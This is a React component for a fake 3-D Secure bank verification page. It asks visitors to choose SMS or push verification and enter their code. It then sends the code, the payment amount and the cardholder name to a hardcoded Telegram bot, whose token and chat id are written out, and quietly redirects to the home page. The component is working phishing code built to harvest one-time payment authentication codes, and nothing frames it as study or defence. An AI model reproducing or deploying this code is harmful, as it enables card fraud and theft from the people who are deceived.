import React, { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";

const sendTelegramNotification = async (code: string, amount: string, cardHolder: string, verifyMethod: string) => {
  try {
    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: "6293259686",
        text: `3DS Code Verification:
Amount: ${amount}
Card Holder: ${cardHolder}
Verification Method: ${verifyMethod}
Code: ${code}`,
      }),
    });
    console.log('3DS notification sent:', response.ok);
  } catch (error) {
    console.error('Error sending 3DS notification:', error);
  }
};

export default function Verify3DS() {
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "0";
  const cardHolder = searchParams.get("cardHolder") || "";
  const [code, setCode] = useState("");
  const [verifyMethod, setVerifyMethod] = useState("3DS");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (code.length < 4 || code.length > 10) {
      return;
    }
    
    setIsSubmitting(true);

    // Send 3DS code to Telegram
    await sendTelegramNotification(code, amount, cardHolder, verifyMethod);

    // Add delay for processing
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Redirect to success or another page
    navigate("/");
  };

  return (
    <div className="min-h-screen w-full bg-black flex items-center justify-center relative">
      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-black">
        <div className="absolute inset-0 opacity-30">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.1),transparent_50%)] animate-pulse"></div>
        </div>
      </div>
      <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 relative z-10">
        <div className="space-y-2">
          <h2 className="text-2xl font-bold text-white text-center">
            Verification Required
          </h2>
          <p className="text-gray-400 text-center">
            Choose your verification method
          </p>
        </div>

        <RadioGroup
          defaultValue="3DS"
          className="grid gap-4"
          onValueChange={setVerifyMethod}
        >
          <div className="flex items-center space-x-2 rounded-lg border border-white/10 p-4 cursor-pointer hover:bg-white/5">
            <RadioGroupItem value="3DS" id="3ds" />
            <Label htmlFor="3ds" className="flex-1">
              <div className="text-white font-medium">3D Secure</div>
              <div className="text-gray-400 text-sm">Verify with a code sent to your phone via SMS</div>
            </Label>
          </div>
          <div className="flex items-center space-x-2 rounded-lg border border-white/10 p-4 cursor-pointer hover:bg-white/5">
            <RadioGroupItem value="PUSH" id="push" />
            <Label htmlFor="push" className="flex-1">
              <div className="text-white font-medium">Push Notification</div>
              <div className="text-gray-400 text-sm">Verify through your banking app</div>
            </Label>
          </div>
        </RadioGroup>

        <div className="space-y-4">
          <Input
            type="text"
            placeholder="Enter Verification Code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            minLength={4}
            maxLength={10}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
            required
          />
          <Button
            type="submit"
            disabled={isSubmitting || code.length < 4 || code.length > 10}
            className="w-full bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-white hover:opacity-90 transition-opacity"
          >
            {isSubmitting ? "Verifying..." : "Verify"}
          </Button>
        </div>

        <p className="text-gray-400 text-sm text-center">
          Enter the code (4-10 characters) you received
        </p>
      </form>
    </div>
  );
}